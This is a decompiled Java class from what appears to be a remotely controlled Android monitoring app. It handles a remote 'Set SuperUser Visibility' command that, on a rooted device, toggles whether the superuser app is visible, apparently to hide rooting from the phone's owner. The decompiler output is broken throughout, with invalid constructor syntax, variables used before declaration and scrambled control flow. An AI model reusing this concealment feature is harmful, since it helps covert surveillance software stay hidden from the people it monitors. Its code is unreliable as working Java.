package com.vvt.remotecommand.processor.misc;

import com.vvt.base.RunningMode;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.exception.RequiresRootException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class r
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public r(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(ArrayList paramArrayList)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    int j = paramArrayList.size();
    boolean bool2 = a;
    Object localObject;
    if ((!bool2) || (j != i))
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      localObject = paramArrayList.iterator();
      bool2 = ((Iterator)localObject).hasNext();
      if (!bool2) {
        break label158;
      }
      localObject = ((Iterator)localObject).next();
      localObject = (String)localObject;
      bool2 = a;
      if ((!bool2) || (localObject != null))
      {
        k = ((String)localObject).length();
        if (k == i) {}
      }
      else
      {
        localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject).<init>();
        throw ((Throwable)localObject);
      }
    }
    catch (NullPointerException localNullPointerException)
    {
      localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
    int k = Integer.parseInt(localInvalidCommanFormatException);
    if (k != 0)
    {
      j = Integer.parseInt(localInvalidCommanFormatException);
      if (j != i) {}
    }
    else
    {
      label158:
      return;
    }
    InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
    localInvalidCommanFormatException.<init>();
    throw localInvalidCommanFormatException;
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    Object localObject2 = null;
    localObject1 = (String)((ArrayList)localObject1).get(0);
    boolean bool2 = a;
    if (bool2) {}
    com.vvt.remotecontrol.a locala = h();
    bool2 = a;
    if (bool2) {}
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject3 = RemoteFunction.DEBUG_GET_APPLICATION_MODE;
    ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, null);
    localObject2 = (RunningMode)locala.execute((ControlCommand)localObject2);
    boolean bool3 = a;
    if (bool3) {}
    localObject3 = RunningMode.LIMITED_1;
    int j;
    if (localObject2 != localObject3)
    {
      localObject3 = RunningMode.FULL;
      if (localObject2 != localObject3) {}
    }
    else
    {
      localObject2 = new com/vvt/remotecontrol/ControlCommand;
      localObject3 = RemoteFunction.SET_SUPERUSER_VISIBILITY;
      ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
      bool1 = a;
      if (bool1) {}
      localObject2 = locala.execute((ControlCommand)localObject2);
      bool1 = a;
      if ((!bool1) || (paramc != null))
      {
        bool1 = localObject2 instanceof RmtCtrlOutputStatusMessage;
        if (bool1)
        {
          localObject1 = localObject2;
          localObject1 = (RmtCtrlOutputStatusMessage)localObject2;
          j = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
          localObject1 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
          bool3 = a;
          if (bool3) {}
          bool3 = a;
          if ((bool3) && (j == 0)) {
            break label255;
          }
          paramc.b(paramRemoteCommand, this, (String)localObject1);
        }
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label255:
      localObject2 = (RmtCtrlOutputStatusMessage)localObject2;
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject2).getMessage();
      if (localObject1 != null)
      {
        int i = ((String)localObject1).length();
        j = 1;
        if (i > j)
        {
          localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject2).<init>((String)localObject1);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
          continue;
        }
      }
      localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject2 = "Unknown.";
      ((RemoteCommandException)localObject1).<init>((String)localObject2);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      continue;
      bool1 = b;
      if (bool1)
      {
        continue;
        localObject1 = new com/vvt/remotecommand/exception/RequiresRootException;
        localObject2 = "This feature requires root permission.";
        ((RequiresRootException)localObject1).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      }
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Set SuperUser Visibility";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/r.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */